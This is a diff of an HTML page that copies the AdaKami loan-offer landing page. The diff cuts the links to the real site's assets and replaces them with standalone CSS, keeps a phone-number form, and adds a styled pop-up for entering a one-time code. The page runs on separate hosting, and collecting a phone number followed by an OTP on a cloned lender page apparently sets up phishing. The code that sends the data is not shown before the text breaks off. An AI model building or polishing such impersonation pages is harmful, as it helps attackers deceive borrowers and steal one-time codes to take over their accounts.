@@ -3,136 +3,291 @@
 <head>
     <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
     <meta name="viewport" content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no,viewport-fit=cover">
-    <title>ADAKAMI</title>
-    <link href="https://h5.adakami.id/landing/css/app.34ebe835.css" rel="stylesheet">
-    <link rel="stylesheet" type="text/css" href="https://h5.adakami.id/landing/css/chunk-common.9b15b62b.css">
-    <link rel="stylesheet" type="text/css" href="https://h5.adakami.id/landing/css/chunk-11d67243.49398c5e.css">
+    <meta name="format-detection" content="telephone=no">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta http-equiv="pragma" content="no-store">
+    <meta http-equiv="Cache-Control" content="no-store, must-revalidate">
+    <meta name="apple-mobile-web-app-capable" content="no">
+    <meta http-equiv="expires" content="0">
+    <title>AdaKami</title>
 
-    <style>
-        /* Perbaikan: Sembunyikan Label saat mengetik */
-        .in-field__native:focus + .in-field__label,
-        .in-field__native:not(:placeholder-shown) + .in-field__label {
-            display: none !important;
-            opacity: 0;
-            visibility: hidden;
-        }
-
-        /* Style Error & OTP */
-        .error-msg { color: #ff3b30; font-size: 11px; margin-top: 5px; margin-bottom: 5px; padding-left: 10px; display: none; }
-        .otp-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); z-index: 9999; display: none; align-items: flex-start; padding-top: 20vh; justify-content: center; }
-        .otp-box { background: #fff; width: 100%; max-width: 480px; border-radius: 20px; padding: 30px 20px; position: relative; animation: slideUp 0.3s ease-out; }
-        @keyframes slideUp { from { transform: translateY(100%); } to { transform: translateY(0); } }
-        .close-otp { position: absolute; top: 15px; right: 15px; font-size: 26px; color: #999; cursor: pointer; line-height: 1; font-weight: bold; z-index: 10; padding: 5px; }
-        .otp-title { font-size: 18px; font-weight: bold; text-align: center; margin-bottom: 10px; color: #333; }
-        .otp-desc { text-align: center; color: #666; font-size: 13px; margin-bottom: 25px; }
-        .otp-inputs { display: flex; justify-content: space-between; margin-bottom: 20px; gap: 5px; }
-        .otp-inputs input { width: 15%; height: 45px; text-align: center; font-size: 20px; border: 1px solid #ddd; border-radius: 8px; outline: none; font-weight: bold; caret-color: #00BFA5; }
-        .otp-inputs input:focus { border-color: #00BFA5; box-shadow: 0 0 0 2px rgba(0, 191, 165, 0.1); }
-        .timer-resend { text-align: center; font-size: 13px; color: #999; margin-bottom: 20px; }
-        .resend-link { color: #00BFA5; text-decoration: none; font-weight: bold; display: none; cursor: pointer; }
-        .loading-overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255,255,255,0.9); display: none; flex-direction: column; align-items: center; justify-content: center; border-radius: 20px; z-index: 100; }
-        .spinner { width: 30px; height: 30px; border: 3px solid #f3f3f3; border-top: 3px solid #00D0B4; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 10px; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .otp-error { text-align: center; color: #ff3b30; font-size: 12px; margin-top: 10px; display: none; }
-        .btn-otp-submit { width: 100%; background: #00D0B4; color: #fff; border: none; padding: 14px; border-radius: 25px; font-size: 16px; font-weight: bold; cursor: pointer; box-shadow: 0 4px 10px rgba(0, 208, 180, 0.3); }
-    </style>
-    
     <!-- Vercel Web Analytics -->
     <script>
         window.va = window.va || function () { (window.vaq = window.vaq || []).push(arguments); };
     </script>
     <script defer src="/_vercel/insights/script.js"></script>
+
+    <style>
+        /* =========================================
+           CSS KUSTOM STANDALONE (TANPA LINK LUAR)
+           ========================================= */
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+        body { background-color: #f5f5f5; color: #333; line-height: 1.5; -webkit-font-smoothing: antialiased; }
+        
+        /* Header */
+        .has-header { padding-top: 50px; }
+        .header-wrap { display: flex; justify-content: space-between; align-items: center; height: 50px; width: 100%; position: fixed; top: 0; left: 0; background-color: #fff; z-index: 100; box-shadow: 0 1px 3px rgba(0,0,0,0.05); }
+        .arrow-left { width: 50px; height: 100%; display: flex; align-items: center; justify-content: center; font-size: 20px; font-weight: bold; color: #333; cursor: pointer; }
+        .title { font-size: 17px; font-weight: 600; flex: 1; text-align: center; }
+        .right-button { width: 50px; }
+
+        /* Main View & Gradasi Latar Belakang Permanen */
+        .main-view { 
+            position: relative; 
+            min-height: calc(100vh - 50px); 
+            background: #f5f5f5 linear-gradient(180deg, #00903B 0%, #006B2D 180px, #f5f5f5 280px) no-repeat; 
+            overflow-x: hidden; 
+        }
+        
+        /* Gambar banner transparan di atas gradasi */
+        .main-logo { 
+            width: 100%; 
+            position: absolute; 
+            top: 0; 
+            left: 0; 
+            z-index: 0; 
+            max-height: 200px;
+            object-fit: contain;
+            object-position: top;
+        }
+
+        .card-wrap { position: relative; z-index: 2; padding: 147px 15px 20px 15px; }
+
+        /* Cards */
+        .new-register-card { background: #fff; border-radius: 16px; padding: 20px; margin-bottom: 15px; box-shadow: 0 4px 12px rgba(0,0,0,0.05); position: relative; }
+        .new-register-card .title { text-align: left; font-size: 16px; font-weight: bold; margin-bottom: 15px; color: #333; display: block; }
+
+        /* Top Card Content */
+        .limit-pinjaman { font-size: 13px; color: #666; text-align: center; margin-bottom: 5px; }
+        .card-amount { font-size: 42px; font-weight: 800; color: #333; text-align: center; margin: 5px 0 10px 0; letter-spacing: -1px; }
+        .interest-rate { display: flex; justify-content: center; align-items: center; background: rgba(0, 144, 59, 0.1); padding: 6px 12px; border-radius: 20px; width: fit-content; margin: 0 auto 20px; font-size: 12px; }
+        .interest-rate__value { color: #00903B; font-weight: bold; margin-left: 4px; }
+        .limit-desc { font-size: 13px; color: #666; font-weight: 500; margin-bottom: 10px; }
+        
+        /* Buttons Grid */
+        .buttons { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-bottom: 25px; }
+        .buttons button { background: #fff; border: 1px solid #eee; border-radius: 20px; padding: 10px 0; font-size: 12px; color: #666; cursor: pointer; transition: 0.2s; }
+        .buttons button:active { background: #f0f0f0; }
+
+        /* Input Field */
+        .mobile-input { display: block; position: relative; margin-bottom: 5px; }
+        .in-field__inner { display: flex; flex-direction: column; }
+        .in-field__control { display: flex; align-items: center; border-bottom: 1px solid #ddd; padding: 5px 0 10px 0; }
+        .mobile-icon { width: 18px; margin-right: 12px; opacity: 0.7; }
+        .in-field__control-container { flex: 1; position: relative; display: flex; align-items: center; }
+        .in-field__native { width: 100%; border: none; outline: none; font-size: 18px; font-weight: 500; color: #333; background: transparent; padding: 5px 0; }
+        .in-field__label { position: absolute; left: 0; font-size: 16px; color: #999; pointer-events: none; transition: 0.2s ease; }
+        
+        /* Sembunyikan Label saat mengetik */
+        .in-field__native:focus + .in-field__label,
+        .in-field__native:not(:placeholder-shown) + .in-field__label { display: none !important; opacity: 0; visibility: hidden; }
+
+        /* Style Error */
+        .error-msg { color: #ff3b30; font-size: 11px; margin-top: 5px; margin-bottom: 15px; padding-left: 30px; display: none; }
+
+        /* Submit Button */
+        .submit-button { width: 100%; background: #00903B; color: #fff; border: none; border-radius: 25px; padding: 14px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 25px; display: flex; flex-direction: column; align-items: center; justify-content: center; box-shadow: 0 6px 15px rgba(0, 144, 59, 0.25); transition: 0.2s; }
+        .submit-button:active { transform: scale(0.98); }
+        .goToNextDesc { font-size: 11px; font-weight: normal; margin-top: 4px; opacity: 0.9; }
+        .form-protocol { text-align: center; font-size: 11px; color: #999; margin-top: 15px; }
+        .form-protocol span { color: #00903B; }
+
+        /* Process Steps */
+        .step-card__list { display: flex; justify-content: space-between; align-items: center; padding: 10px 20px; }
+        .process-item { display: flex; flex-direction: column; align-items: center; }
+        .process-arrow { width: 25px; opacity: 0.3; }
+        .step-card__desc-list { display: flex; justify-content: space-between; text-align: center; font-size: 11px; color: #666; margin-top: 5px; }
+        .step-card__desc-list p { width: 33%; line-height: 1.3; }
+
+        /* Rincian Produk */
+        .amount-card__item { display: flex; justify-content: space-between; font-size: 12px; margin-bottom: 12px; color: #666; }
+        .amount-card__item__right { color: #333; font-weight: 500; text-align: right; }
+        .repay-plan { margin-top: 20px; border-radius: 8px; overflow: hidden; border: 1px solid #eee; }
+        .repay-plan-table { width: 100%; border-collapse: collapse; font-size: 11px; text-align: center; }
+        .repay-plan-table th, .repay-plan-table td { padding: 10px 5px; border-bottom: 1px solid #eee; }
+        .repay-plan-table th { background: #f8f8f8; color: #666; font-weight: 500; }
+        .dark-cell { background: #fafafa; }
+        .left-align { text-align: left; padding-left: 10px !important; }
+        .right-align { text-align: right; padding-right: 10px !important; }
+
+        /* Footer & Company */
+        .ad-card { text-align: center; }
+        .ad-card__content { font-size: 10px; color: #999; line-height: 1.4; margin: 15px 0; text-align: justify; }
+        .company { margin-top: 15px; border-top: 1px solid #eee; padding-top: 15px; }
+        .company__item { display: flex; align-items: center; margin-bottom: 12px; font-size: 11px; color: #999; text-align: left; }
+        .company__icon { width: 24px; margin-right: 12px; }
+
+        /* =========================================
+           MODAL OTP STYLE
+           ========================================= */
+        .otp-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.6); z-index: 9999; display: none; align-items: flex-start; padding-top: 20vh; justify-content: center; backdrop-filter: blur(3px); }
+        .otp-box { background: #fff; width: 90%; max-width: 400px; border-radius: 20px; padding: 30px 20px; position: relative; animation: slideUp 0.3s ease-out; box-shadow: 0 10px 30px rgba(0,0,0,0.2); }
+        @keyframes slideUp { from { transform: translateY(50px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
+        .close-otp { position: absolute; top: 15px; right: 15px; font-size: 28px; color: #ccc; cursor: pointer; line-height: 1; font-weight: 300; padding: 5px; transition: 0.2s; }
+        .close-otp:active { color: #666; }
+        .otp-title { font-size: 20px; font-weight: 700; text-align: center; margin-bottom: 8px; color: #333; }
+        .otp-desc { text-align: center; color: #666; font-size: 13px; margin-bottom: 25px; line-height: 1.4; }
+        .otp-inputs { display: flex; justify-content: space-between; margin-bottom: 25px; gap: 6px; }
+        .otp-inputs input { width: 100%; height: 50px; text-align: center; font-size: 22px; border: 1px solid #ddd; border-radius: 10px; outline: none; font-weight: 700; color: #333; background: #fafafa; transition: 0.2s; caret-color: #00903B; }
+        .otp-inputs input:focus { border-color: #00903B; background: #fff; box-shadow: 0 0 0 3px rgba(0, 144, 59, 0.15); }
+        .timer-resend { text-align: center; font-size: 13px; color: #999; margin-bottom: 25px; font-weight: 500; }
+        .resend-link { color: #00903B; text-decoration: none; font-weight: bold; display: none; cursor: pointer; }
+        .loading-overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255,255,255,0.9); display: none; flex-direction: column; align-items: center; justify-content: center; border-radius: 20px; z-index: 100; }
+        .spinner { width: 35px; height: 35px; border: 3px solid #f3f3f3; border-top: 3px solid #00903B; border-radius: 50%; animation: spin 0.8s linear infinite; margin-bottom: 12px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .otp-error { text-align: center; color: #ff3b30; font-size: 12px; margin-top: 10px; margin-bottom: 15px; display: none; font-weight: 500; }
+        .btn-otp-submit { width: 100%; background: #00903B; color: #fff; border: none; padding: 15px; border-radius: 25px; font-size: 16px; font-weight: bold; cursor: pointer; box-shadow: 0 4px 12px rgba(0, 144, 59, 0.3); transition: 0.2s; }
+        .btn-otp-submit:active { transform: scale(0.98); }
+    </style>
 </head>
 <body>
-    <!-- SEMUA KONTEN ASLI KAMU TETAP 100% -->
-    <div data-v-352a17d7="" data-v-80e995f6="">
-        <div data-v-63de1b46="" data-v-352a17d7="" class="has-header">
-            <div data-v-240c66c6="" data-v-63de1b46="" class="header-wrap app-style-bg-color header-fixed" style="background-color: rgb(255, 255, 255);">
-                <div data-v-240c66c6="" class="arrow-left thin-side-area" style="display: flex; align-items: center; padding-left: 15px; font-size: 22px; font-weight: bold; color: #333; cursor: pointer;">
-                    &lt;
-                </div>
-                <div data-v-240c66c6="" class="title">AdaKami</div>
-                <div data-v-240c66c6="" class="right-button thin-side-area" style="color: rgb(51, 51, 51);"></div>
+    <div class="has-header">
+        <div class="header-wrap">
+            <div class="arrow-left" onclick="history.back()">
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#333" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 18l-6-6 6-6"/></svg>
             </div>
+            <div class="title">AdaKami</div>
+            <div class="right-button"></div>
+        </div>
 
-            <div data-v-63de1b46="" class="main-view">
-                <img data-v-63de1b46="" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAF0AAAA/CAMAAAC1kzSgAAAA21BMVEUAAABm8Hd05H975YF65YF07IB65YF38IF17oB16oB26oBv6nt36IF464Jx7n148IJ57IJ36oF37oB65IJh522A74Br6nl46IAAsC8AszC+/69644F68IMAwTIAvTEAuDEAxTMAyjQAzjSm9Z8Yuj9f2W+y+qcAtjBGzl8LtTZr3HeO648vxE924X9654IAujF67YJT02eC5od664I7yVcAxzN66YIjv0ZT0mea8Jcy2lMPtzlF2182x1Ma00Rp53cP0j5z635M4mZM0mIQvjoKxjlc42820VUmyUtBlyaRAAAAGHRSTlMAKCHw4J6Q59a6qzzMc2j08+aUYBUQSmJxWLNXAAADmklEQVRYw7XVZ1ujQBAH8Nhyif1s5+3aThYCS0khzZjEdup9/090W0YH2DW+AObx0WQxP4Y/w6bxVe3sHbVaPy7KlZ3ebx/A8cr1tW2gy5fF1gcenmfL5eNtubLbb7PH2z8VVCFvdRufH9Wh0Wh0U6pGoxy+9Wkr97Js3WRTacm4l4LW8lX5yuAylfmttJXc7V6XrG43h/dmytZyp9P5Xao6ness/jQDW9Agl/QBP2kJfDmSmXSRPi9TWodp6fVmsnGwQS7Lw5xLHBpHujyvczno9eY31dmoQy4Pr4hXq59d9NIl4GBXqO/20jniFetnvfTp9RLwyvUj1TrgVesnh+n49aprwYMpj7nrR5mliMcxVwtYQ9/PvZlk9f00fRO5GDgLCZQTB3ppcgcLLPuPDiGfr119EPV2On4XuRi4oxyt4ZI3CMVvJ7DrfcBRF8FcQi6Fju4igbAodqZ6KSZkIFfEFUyt+hBw1HfS8YOl9WG2QXghomJwLLbpE494KnTU99LxvIs4Bgj9WZiJRYfgosLMHI2T92tT54T4RV0ko67CJ8Qt6ID7xYlsj5N/1+akTwnhtjVgmKEHDp4T9Z/j5G/H1CNCvNzcARBJHBnU7wxc6Ympwy10fMspuScZQ4/ldZn6YZIYwUCM0s/33yeivL55s10xrLadYJwkqnWTHxBZMSs+vkNzlASOQa7WMYgw7/dFKPIHxs4Pwwh0tR6e23MH3SwWO7ityAZ54BIYPHkfgw/dZZ71rrYSyuw4NuxIhQlEJv7Bs4+oHbU+FMuRoe8mdLJCF4qno46hOeDhecOniUMXOb2Z0MUKXWr6wff0MwS8y/TWiXpwh3OD+0xCX1brkf4UkQjyHrQOOlxkv6DvJNT9Vue69yDLQ6Og6/3H2CMbG5Ter9Rj3SVuALpNwos6Ro96m9LIEnaU+zLTf70hzpHMHnXciHhe/2WNxiFeOHCnLpeQDx8Vabi+G6vG+8CjjvOFOkRj6lC4rzBckxfhax503Ig8ltO3KH0xdMZDTznhFJP0Q70UwTu9FQzCzB7Aw9DN6ev0q/sasMC29H2hDs1XWahD8xBW1To0z4Pa9PVNSv3a9MaxyGZRm95oCj6qTW/sUhqzenSIPo5q0JGnizp05P2gYh35XcHzSU1647RJof2qdZj7DcHH/n0NOrZP3UVQpY6106aquL+Y3N9XpqPf3KAVVcNWp8fbG3XoWGt7ze3NzZIn+Q8E6j8WPG10vgAAAABJRU5ErkJggg==" class="main-rule">
-                <img data-v-63de1b46="" src="https://h5.adakami.id/landing/img/eighthHeader.cc09398a.png" class="main-logo">
-                
-                <div data-v-63de1b46="" class="card-wrap">
-                    <div data-v-0deb0f5c="" data-v-b9c7316e="" data-v-63de1b46="" class="register-card main-card">
-                        <form data-v-97eecd9a="" data-v-b9c7316e="" class="in-form" data-v-0deb0f5c="" id="phoneForm" onsubmit="handlePhoneSubmit(event)">
-                            <div data-v-b9c7316e="" data-v-97eecd9a="" class="card-top">
-                                <p data-v-b9c7316e="" data-v-97eecd9a="" class="limit-pinjaman">Limit pinjaman maks(Rp)</p>
-                                <p data-v-b9c7316e="" data-v-97eecd9a="" class="card-amount">
-                                    <img data-v-b9c7316e="" data-v-97eecd9a="" src="https://h5.adakami.id/landing/img/80000000.4de1c516.png" alt="80,000,000">
-                                </p>
-                                <div data-v-b9c7316e="" data-v-97eecd9a="" class="interest-rate">
-                                    <span data-v-b9c7316e="" data-v-97eecd9a="" class="interest-rate__label">Bunga serendah </span>
-                                    <span data-v-b9c7316e="" data-v-97eecd9a="" class="interest-rate__value">0,03% </span>
-                                </div>
-                                <p data-v-b9c7316e="" data-v-97eecd9a="" class="limit-desc">Limit yang Anda inginkan</p>
-                                <div data-v-b9c7316e="" data-v-97eecd9a="" class="buttons">
-                                    <button data-v-b9c7316e="" data-v-97eecd9a="" type="button" class=""> 0\~1Juta </button>
-                                    <button data-v-b9c7316e="" data-v-97eecd9a="" type="button" class=""> 1Juta\~5Juta </button>
-                                    <button data-v-b9c7316e="" data-v-97eecd9a="" type="button" class=""> 5Juta\~20Juta </button>
-                                    <button data-v-b9c7316e="" data-v-97eecd9a="" type="button" class=""> 20Juta\~40Juta </button>
-                                    <button data-v-b9c7316e="" data-v-97eecd9a="" type="button" class=""> 40Juta\~60Juta </button>
-                                    <button data-v-b9c7316e="" data-v-97eecd9a="" type="button" class=""> 60Juta+ </button>
-                                </div>
-                                <div data-v-b9c7316e="" data-v-97eecd9a="" class="limit-tip">
-                                    <img data-v-b9c7316e="" data-v-97eecd9a="" src="data:image/png;base64,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" alt="rp">
-                                    <p data-v-b9c7316e="" data-v-97eecd9a="">Pilih limit berkesempatan dapat <span data-v-b9c7316e="" data-v-97eecd9a="">kupon ekstra!</span></p>
-                                </div>
+        <div class="main-view" id="mainView">
+            <img src="./eighthHeader.cc09398a.png" class="main-logo" id="headerImage" onerror="this.style.display='none';">
+            
+            <div class="card-wrap">
+                <div class="new-register-card main-card">
+                    <form class="in-form" id="phoneForm" onsubmit="handlePhoneSubmit(event)">
+                        <div class="card-top">
+                            <p class="limit-pinjaman">Limit pinjaman maks(Rp)</p>
+                            <p class="card-amount">80.000.000</p>
+                            <div class="interest-rate">
+                                <span class="interest-rate__label">Bunga serendah </span>
+                                <span class="interest-rate__value">0,03% </span>
                             </div>
-                            <label data-v-4090ba9a="" data-v-b9c7316e="" for="phoneNumber" class="mobile-input in-field in-field--label in-validation-component" data-v-97eecd9a="" style="display: block; width: 100%;">
-                                <div data-v-4090ba9a="" class="in-field__inner">
-                                    <div data-v-4090ba9a="" class="in-field__control">
-                                        <div data-v-4090ba9a="" class="in-field__prepend">
-                                            <div data-v-b9c7316e="" data-v-4090ba9a="" class="input-prepend">
-                                                <img data-v-b9c7316e="" data-v-4090ba9a="" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACQAAAAwCAYAAAB5R9gVAAAAAXNSR0IArs4c6QAAAARzQklUCAgICHwIZIgAAAJJSURBVFiF7ZlPbtpAFId/b5hFlz6CK/UAZF+pHAGWlQrNyIEt5ATtDUq3CeghcoCkB6jqSt2XA1Sqj+ADmHld1IDBgUk7MtnMt8Lz570Pz9iW3hAqMHNUKDuBojcQaQOI0Aw5hDKQpHqtPhtjsk0HbX7cLOeXBHxqUOKonADXo0Gy2ArdLucT/JV5NgQwo0GyIGaOi5b9fdCfEyEFIX90tsUrAV6fSkDADyj8ejw7xVLfErleqwu9btkP+5Eo1QWZ6roeUt7Rk0Ii+Dp8l3w81s/McaGFIdIpm6KiZcdKhNp7lg4ZANBrtSDg6BgCMm3V4lQMY0ymC+oBu1UQQZdul3PZBiI8XPWT3qlAVZg5wov6Q2Denv5DVWZ383sRdDfXeq/32J45gjEmB/5tTg1CDtldKq9gDRCEXAQhF0HIRRByEYRcBCEXQchFEHIRhFwEIRdByEUQcqHdQ05TVk/GAACyX4b9YeoTz+sOze5m3bKUMwEwgahvN8v55bMJWUu1IhcJjX1iegkRIa43Srs+8un4bWqhVa2NKPUJ6SWkLfWqhSsCMl2Q8YrpM9kYkzHzRaGLNqBx1TepTzxvoVIqB+AtsmF/yeTsNepaTiWy2wMi6DDz2aSYOYZg91QKrRQRHipjokLLPTPHZ5CJCi0s2L06iGS1KZz/xEERm4hWIMkasRFEIugc5IReq5cEbM85uJHkT+d6OEimCgBGg2QhgIFviff/yAUww0EyBSqnQcD2y92F0HuQxGjyeIpoBSvftVXT8tUBAPgDa1jYbty0n98AAAAASUVORK5CYII=" class="mobile-icon">
-                                            </div>
-                                        </div>
-                                        <div data-v-4090ba9a="" class="in-field__control-container">
-                                            <input data-v-4090ba9a="" id="phoneNumber" maxlength="14" type="tel" class="in-field__native" placeholder=" " oninput="validateInput(this)">
-                                            <div data-v-4090ba9a="" class="in-field__label" id="phoneLabel">Masukkan Nomor HP</div>
-                                        </div>
+                            <p class="limit-desc">Limit yang Anda inginkan</p>
+                            <div class="buttons">
+                                <button type="button"> 0~1Juta </button>
+                                <button type="button"> 1Juta~5Juta </button>
+                                <button type="button"> 5Juta~20Juta </button>
+                                <button type="button"> 20Juta~40Juta </button>
+                                <button type="button"> 40Juta~60Juta </button>
+                                <button type="button"> 60Juta+ </button>
+                            </div>
+                        </div>
+                        
+                        <label for="phoneNumber" class="mobile-input">
+                            <div class="in-field__inner">
+                                <div class="in-field__control">
+                                    <div class="in-field__prepend">
+                                        <svg class="mobile-icon" viewBox="0 0 24 24" fill="none" stroke="#00903B" stroke-width="2"><rect x="5" y="2" width="14" height="20" rx="2" ry="2"></rect><line x1="12" y1="18" x2="12.01" y2="18"></line></svg>
+                                    </div>
+                                    <div class="in-field__control-container">
+                                        <input id="phoneNumber" maxlength="14" type="tel" class="in-field__native" placeholder=" " oninput="validateInput(this)" autocomplete="off">
+                                        <div class="in-field__label" id="phoneLabel">Masukkan Nomor HP</div>
                                     </div>
                                 </div>
-                            </label>
-                            
-                            <div class="error-msg" id="phoneError">Format nomor ponsel salah, silakan masukkan 10-13 angka dimulai dengan 08</div>
-                            
